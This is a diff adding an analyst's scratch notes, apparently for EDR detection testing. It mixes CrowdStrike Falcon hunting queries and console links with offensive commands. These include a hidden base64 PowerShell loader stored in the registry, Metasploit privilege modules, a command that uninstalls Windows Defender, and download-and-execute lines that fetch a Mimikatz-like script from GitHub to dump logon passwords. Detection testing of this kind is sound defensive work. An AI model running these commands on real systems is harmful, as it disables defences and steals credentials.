@@ -1,0 +1,145 @@
+Novo  de MemDump - salvar como .PS1
+==================================
+
+
+
+detections
+
+
+http://dontpad.com/paralelepipedo8819
+
+
+
+
+(event_simpleName=processrollup2 OR event_simpleName=syntheticprocessrollup2 OR event_simpleName=associatetreeidwithroot OR event_simpleName=cloudassociatetreeidwithroot OR event_simpleName=associateindicator OR ExternalApiType=Event_DetectionSummaryEvent)
+| eval MasterPID=coalesce(ProcessId, TargetProcessId_decimal)
+| stats values(CommandLine) AS Triggering_CL, values(PatternId_decimal) AS PatternID, values(TemplateInstanceId_decimal) AS InstanceID, values(DetectScenario) AS Scenario, values(DetectName) AS Name, values(DetectDeion) AS Deion, values(Nonce) AS Ignore by MasterPID
+| where Triggering_CL!="" AND PatternID!="" AND isnull(Ignore)
+
+
+
+
+https://falcon.us-2.crowdstrike.com/crowdscore/incidents/details/inc:68efad3dd29d49b0808c463a2119359c:26cf72a025504afa8ab0c38421bd88ae/graph
+
+
+
+earliest=-7d event_simpleName=UserLogonFailed2
+| iplocation RemoteIP
+| stats dc(aid) as uniqueSystems count(aid) as failedLogonAttempts values(Country) as Countries values(ComputerName) as Endpoints by company
+| sort – failedLogonAttempts
+
+
+https://falcon.us-2.crowdstrike.com/hosts/hosts/host/3366bd1c94ab4f52bc13b6abc4b33fb1
+
+
+
+https://falcon.us-2.crowdstrike.com/support/news/release-notes-falcon-sensor-for-linux-6-12-10912
+
+
+
+https://falcon.us-2.crowdstrike.com/hosts/hosts/host/3366bd1c94ab4f52bc13b6abc4b33fb1
+
+
+
+
+
+
+https://falcon.us-2.crowdstrike.com/investigate/process-explorer/7d9ef1cecc234421a6b06c25b726e947/9808146722?_cid=f2dce2fb742340dfb78757e39855e5af
+
+
+
+https://falcon.us-2.crowdstrike.com/investigate/events/en-US/app/eam2/search?q=search%20event_platform%3DLin%0A%7C%20stats%20count%20by%20event_simpleName%20&display.page.search.mode=verbose&dispatch.sample_ratio=1&earliest=-24h%40h&latest=now&display.page.search.tab=statistics&display.general.type=statistics&sid=1607697824.6157
+
+
+
+
+https://falcon.us-2.crowdstrike.com/investigate/events/en-US/app/eam2/search?q=search%20event_platform%3DWin%20event_simpleName%3DAgentConnect%20earliest%3D-7d%20latest%3Dnow%0A%7C%20dedup%20aid%0A%7C%20eval%20ConnectionProtocol%3Dcase(ConnectionProtocol_decimal%3D128%2C%20%22TLS%201.0%22%2C%20ConnectionProtocol_decimal%3D512%2C%20%22TLS%201.1%22%2C%20ConnectionProtocol_decimal%3D2048%2C%20%22TLS%201.2%22)%0A%7C%20rename%20ConfigIDBuild_decimal%20as%20SensorBuild%0A%7C%20join%20aid%20%0A%20%20%20%20%5Bsearch%20event_platform%3DWin%20event_simpleName%3DOSVersionInfo%20earliest%3D-7d%20latest%3Dnow%20%0A%20%20%20%20%7C%20dedup%20aid%0A%20%20%20%20%7C%20fields%20aid%20WinOSVersion%5D%0A%7C%20table%20aid%20ComputerName%20WinOSVersion%20ConnectionProtocol%20SensorBuild&display.page.search.mode=verbose&dispatch.sample_ratio=1&earliest=-24h%40h&latest=now&display.page.search.tab=statistics&display.general.type=statistics&sid=1607698670.6254
+
+
+
+
+https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/
+
+
+
+
+https://github.com/marcos-borges/files/
+
+
+
+
+
+
+
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noprofile -windowstyle hidden -executionpolicy bypass iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\WJFNKQVQSMIXON').tFRVK)));
+
+
+
+
+
+
+
+run post/windows/gather/win_privs
+
+
+
+
+
+
+use exploit/windows/local/ask
+
+[System.Net.WebProxy]::GetDefaultProxy()
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+
+https://github.com/marcos-borges/PS-DFIR
+
+
+
+
+
+
+
+Uninstall-WindowsFeature -Name Windows-Defender
+
+
+
+
+
+https://falcon.us-2.crowdstrike.com/support/documentation/62/streaming-api-event-dictionary
+
+
+
+
+https://github.com/op7ic/EDR-Testing-
+
+
+https://falcon.us-2.crowdstrike.com/activity/detections?groupBy=technique_id&sortBy=date%3Adesc
+https://falcon.us-2.crowdstrike.com/activity/detections?groupBy=technique&sortBy=term%3Aasc
+https://falcon.us-2.crowdstrike.com/activity/detections?groupBy=tactic&sortBy=term%3Aasc
+https://falcon.us-2.crowdstrike.com/activity/detections?filter=technique%3A%27BITS%20Jobs%27&groupBy=none&sortBy=date%3Adesc
+https://falcon.us-2.crowdstrike.com/activity/detections?filter=technique%3A%27PowerShell%27&groupBy=none&sortBy=date%3Adesc
+https://falcon.us-2.crowdstrike.com/activity/detections?filter=technique%3A%27Regsvr32%27&groupBy=none&sortBy=date%3Adesc
+https://falcon.us-2.crowdstrike.com/activity/detections?filter=technique%3A%27Trusted%20Developer%20Utilities%27&groupBy=none&sortBy=date%3Adesc
+https://falcon.us-2.crowdstrike.com/activity/detections?filter=technique%3A%27Rundll32%27&groupBy=none&sortBy=date%3Adesc
+https://falcon.us-2.crowdstrike.com/activity/detections?filter=technique%3A%27Indirect%20Command%20Execution%27&groupBy=none&sortBy=date%3Adesc
+https://falcon.us-2.crowdstrike.com/activity/detections?filter=technique%3A%27Deobfuscate%2FDecode%20Files%20or%20Information%27&groupBy=none&sortBy=date%3Adesc
+https://falcon.us-2.crowdstrike.com/activity/detections?filter=technique%3A%27NTFS%20File%20Attributes%27&groupBy=none&sortBy=date%3Adesc
+https://falcon.us-2.crowdstrike.com/activity/detections?filter=technique%3A%27Process%20Injection%27&groupBy=none&sortBy=date%3Adesc
+https://falcon.us-2.crowdstrike.com/investigate/events/en-US/app/eam2/hunt_scheduledtask?earliest=-7d%40h&latest=now&form.computer=*&form.aid_tok=*&form.customer_tok=*
+
+
+
+
+
+https://github.com/EmpireProject/Empire
+
+
+
+C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -exec bypass -C "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (New-Object Net.WebClient).DownloadString('https://github.com/marcos-borges/files/raw/master/Invoke-Mimimi.ps1');Invoke-Mimimi -Command Privilege::debug"
+
+
+C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -exec bypass -C "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (New-Object Net.WebClient).DownloadString('https://github.com/marcos-borges/files/raw/master/Invoke-Mimimi.ps1');Invoke-Mimimi -Command Sekurlsa::logonpasswords"
+
+
